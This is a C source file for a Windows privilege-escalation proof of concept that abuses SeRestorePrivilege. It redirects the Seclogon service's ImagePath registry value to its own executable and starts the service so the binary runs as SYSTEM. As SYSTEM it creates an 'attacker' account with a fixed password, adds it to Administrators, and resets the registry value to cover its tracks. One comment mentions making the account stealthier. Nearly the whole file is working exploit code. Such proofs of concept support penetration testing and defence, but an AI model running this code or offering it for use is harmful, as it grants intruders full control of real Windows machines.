/**

    @file      SeRestoreAbuse.c
    @author    @rhymenaucerous
    @brief     This is a modified version of the original SeRestoreAbuse PoC
               by @xct_de. The original code can be found here:
               https://github.com/xct/SeRestoreAbuse

    Exploit SeRestorePrivilege by modifying Seclogon ImagePath
    Author: @xct_de

**/

// Standard C includes
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>   // for output to console
#include <process.h> // for _wsystem

// Header includes
#include "SeRestoreAbuse.h" // Custom error printing macro definition

// ############################## Enums ##############################

#define SECLOGON_REG_KEY         L"SYSTEM\\CurrentControlSet\\Services\\SecLogon"
#define SECLOGON_SERVICE_NAME    L"Seclogon"
#define SECLOGON_IMAGE_PATH_NAME L"ImagePath"
#define SECLOGON_IMAGE_PATH      L"%windir%\\system32\\svchost.exe -k netsvcs -p"

#define COMMAND_1 L"cmd /c net user /add attacker password123"
#define COMMAND_2 L"cmd /c net localgroup administrators attacker /add"

typedef enum
{
    STATUS_SUCCESS           = 0,   // Operation successful
    STATUS_INVALID_PARAM     = 1,   // Invalid parameter passed
    STATUS_MEMORY_ALLOCATION = 2,   // Memory allocation failure
    STATUS_ERR_GENERIC       = 100, // Generic error
} STATUS;

// ############################# Fn Declarations #############################

/**
    @brief  Set the SeRestorePrivilege for the current process token.
    @retval        - STATUS_SUCCESS on success
                   - STATUS_ERR_GENERIC on failure
**/
static STATUS SetRestorePrivilege();

/**
    @brief  Sets or unsets a privilege for the current process token.
    @param  hToken           - Handle to the process token.
    @param  pPrivilegeName   - Name of the privilege to set or unset (e.g.,
                               SE_RESTORE_NAME).
    @param  bEnablePrivilege - TRUE to enable the privilege, FALSE to disable
it.
    @retval                  - STATUS_SUCCESS on success, STATUS_ERR_GENERIC on
failure.
**/
static STATUS SetPrivilege(HANDLE hToken,
                           PWCHAR pPrivilegeName,
                           BOOL   bEnablePrivilege);

/**
    @brief  Sets the ImagePath value of the Seclogon service to point to this
            executable. This allows an attacker with SeRestorePrivilege to
execute arbitrary code in the context of the Local System account when the
Seclogon service starts.
    @retval  - STATUS_SUCCESS on success
             - STATUS_ERR_GENERIC on failure
**/
static STATUS SetSelfAsRegKey();

/**
    @brief  Resets the ImagePath value of the Seclogon service to point back
    to the default svchost.exe. This is a cleanup step to remove traces of the
    attack.
    @retval  - STATUS_SUCCESS on success
             - STATUS_ERR_GENERIC on failure
**/
static STATUS ResetRegKey();

/**
    @brief  Starts the Seclogon service, which will execute the code at the
ImagePath registry value we set in SetSelfAsRegKey. This will run our executable
            with Local System privileges.
    @retval  - STATUS_SUCCESS on success
             - STATUS_ERR_GENERIC on failure
**/
static STATUS StartSecLogonService();

// ############################## Fn Definitions ##############################

INT
wmain (INT iArgc, PWCHAR *ppArgv)
{
    UNREFERENCED_PARAMETER(iArgc);
    UNREFERENCED_PARAMETER(ppArgv);

    STATUS Status               = STATUS_ERR_GENERIC;
    BOOL   bStatus              = FALSE;
    INT    iStatus              = 0;
    WCHAR  szUserName[MAX_PATH] = { 0 };
    DWORD  dwSize               = MAX_PATH;

    // Whether we are setting or resetting the registry key, we need to have
    // SeRestorePrivilege.
    Status = SetRestorePrivilege();
    if (STATUS_SUCCESS != Status)
    {
        wprintf(L"SetRestorePrivilege failed\n");
        goto EXIT;
    }

    // If the user is NT AUTHORITY\SYSTEM, we'll create a new user, otherwise
    // we'll set the registry key and start the service.
    bStatus = GetUserNameW(szUserName, &dwSize);
    if (FALSE == bStatus)
    {
        PRINT_ERROR("GetUserNameW failed");
        goto EXIT;
    }

    iStatus = wcscmp(szUserName, L"SYSTEM");
    if (0 == iStatus)
    {
        // TODO: In a real pentest, you would want to create a more stealthy
        // user and add it to the Administrators group. You'd also probably
        // do it with the win32 API and not _wsystem. This is just for
        // demonstration purposes.
        _wsystem(COMMAND_1);
        _wsystem(COMMAND_2);
        Status = ResetRegKey();
        if (STATUS_SUCCESS != Status)
        {
            PRINT_ERROR("ResetRegKey failed");
        }
    }
    else
    {
        Status = SetSelfAsRegKey();
        if (STATUS_SUCCESS != Status)
        {
            PRINT_ERROR("SetSelfAsRegKey failed");
            goto EXIT;
        }

        Status = StartSecLogonService();
        if (STATUS_SUCCESS != Status)
        {
            PRINT_ERROR("StartSecLogonService failed");
        }
    }

    Status = STATUS_SUCCESS;
EXIT:
    return Status;
} // wmain

static STATUS
SetRestorePrivilege ()
{
    STATUS Status   = STATUS_ERR_GENERIC;
    BOOL   bStatus  = FALSE;
    HANDLE hProcess = NULL;
    HANDLE hToken   = NULL;

    hProcess = GetCurrentProcess();
    bStatus  = OpenProcessToken(
        hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    if (FALSE == bStatus)
    {
        PRINT_ERROR("OpenProcessToken failed");
        goto EXIT;
    }

    Status = SetPrivilege(hToken, SE_RESTORE_NAME, TRUE);
    if (STATUS_SUCCESS != Status)
    {
        PRINT_ERROR("SetPrivilege failed");
        goto EXIT;
    }

    Status = STATUS_SUCCESS;
EXIT:
    return Status;
} // SetRestorePrivilege

static STATUS
SetPrivilege (HANDLE hToken, PWCHAR pPrivilegeName, BOOL bEnablePrivilege)
{
    STATUS           Status  = STATUS_ERR_GENERIC;
    TOKEN_PRIVILEGES tp      = { 0 };
    LUID             luid    = { 0 };
    BOOL             bStatus = FALSE;

    // Set privileges on the local system
    bStatus = LookupPrivilegeValueW(NULL, pPrivilegeName, &luid);
    if (FALSE == bStatus)
    {
        PRINT_ERROR("LookupPrivilegeValueW failed");
        goto EXIT;
    }

    tp.PrivilegeCount     = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
    {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else
    {
        tp.Privileges[0].Attributes = 0;
    }

    bStatus = AdjustTokenPrivileges(
        hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (FALSE == bStatus)
    {
        PRINT_ERROR("AdjustTokenPrivileges failed");
        goto EXIT;
    }

    Status = STATUS_SUCCESS;
EXIT:
    return Status;
} // SetPrivilege

static STATUS
SetSelfAsRegKey ()
{
    STATUS Status              = STATUS_ERR_GENERIC;
    LONG   lStatus             = 1; // non-zero to indicate failure
    WCHAR  szExePath[MAX_PATH] = { 0 };
    HKEY   hKey                = NULL;

    // Get path to this executable
    if (0 == GetModuleFileNameW(NULL, szExePath, MAX_PATH))
    {
        PRINT_ERROR("GetModuleFileNameW failed");
        goto EXIT;
    }

    lStatus = RegCreateKeyExW(HKEY_LOCAL_MACHINE,
                              SECLOGON_REG_KEY,
                              0,                         // Reserved
                              NULL,                      // Class
                              REG_OPTION_BACKUP_RESTORE, // Options
                              KEY_SET_VALUE,             // Desired access
                              NULL,                      // Security attributes
                              &hKey,                     // Resulting key handle
                              NULL);                     // Disposition
    if (ERROR_SUCCESS != lStatus)
    {
        PRINT_ERROR("RegCreateKeyExW failed");
        goto EXIT;
    }

    lStatus = RegSetValueExW(hKey,
                             SECLOGON_IMAGE_PATH_NAME,
                             0,      // Reserved
                             REG_SZ, // Type
                             (PBYTE)szExePath,
                             (wcslen(szExePath) + 1)
                                 * sizeof(WCHAR)); // +1 for null terminator
    if (ERROR_SUCCESS != lStatus)
    {
        PRINT_ERROR("RegSetValueExW failed");
        goto EXIT;
    }

    Status = STATUS_SUCCESS;
EXIT:
    if (NULL != hKey)
    {
        RegCloseKey(hKey);
    }
    return Status;
} // SetSelfAsRegKey

static STATUS
ResetRegKey ()
{
    STATUS Status              = STATUS_ERR_GENERIC;
    LONG   lStatus             = 1; // non-zero to indicate failure
    WCHAR  szExePath[MAX_PATH] = { 0 };
    HKEY   hKey                = NULL;

    // Get path to this executable
    if (0 == GetModuleFileNameW(NULL, szExePath, MAX_PATH))
    {
        PRINT_ERROR("GetModuleFileNameW failed");
        goto EXIT;
    }

    lStatus = RegCreateKeyExW(HKEY_LOCAL_MACHINE,
                              SECLOGON_REG_KEY,
                              0,                         // Reserved
                              NULL,                      // Class
                              REG_OPTION_BACKUP_RESTORE, // Options
                              KEY_SET_VALUE,             // Desired access
                              NULL,                      // Security attributes
                              &hKey,                     // Resulting key handle
                              NULL);                     // Disposition
    if (ERROR_SUCCESS != lStatus)
    {
        PRINT_ERROR("RegCreateKeyExW failed");
        goto EXIT;
    }

    lStatus = RegSetValueExW(hKey,
                             SECLOGON_IMAGE_PATH_NAME,
                             0,             // Reserved
                             REG_EXPAND_SZ, // Type
                             (PBYTE)SECLOGON_IMAGE_PATH,
                             (wcslen(SECLOGON_IMAGE_PATH) + 1)
                                 * sizeof(WCHAR)); // +1 for null terminator
    if (ERROR_SUCCESS != lStatus)
    {
        PRINT_ERROR("RegSetValueExW failed");
        goto EXIT;
    }

    Status = STATUS_SUCCESS;
EXIT:
    if (NULL != hKey)
    {
        RegCloseKey(hKey);
    }
    return Status;
} // ResetRegKey

static STATUS
StartSecLogonService ()
{
    STATUS    Status       = STATUS_ERR_GENERIC;
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService   = NULL;
    BOOL      bStatus      = FALSE;

    schSCManager = OpenSCManagerW(NULL, NULL, SERVICE_START);
    if (NULL == schSCManager)
    {
        PRINT_ERROR("Failed to open SCM.");
        goto EXIT;
    }

    schService
        = OpenServiceW(schSCManager, SECLOGON_SERVICE_NAME, SERVICE_START);
    if (NULL == schService)
    {
        PRINT_ERROR("Failed to open seclogon service.");
        goto EXIT;
    }

    bStatus = StartServiceW(schService, 0, NULL);
    if (FALSE == bStatus)
    {
        PRINT_ERROR("Failed to start seclogon service.");
        goto EXIT;
    }

    Status = STATUS_SUCCESS;
EXIT:
    if (NULL != schService)
    {
        CloseServiceHandle(schService);
    }
    if (NULL != schSCManager)
    {
        CloseServiceHandle(schSCManager);
    }
    return Status;
} // StartSecLogonService

// End of file
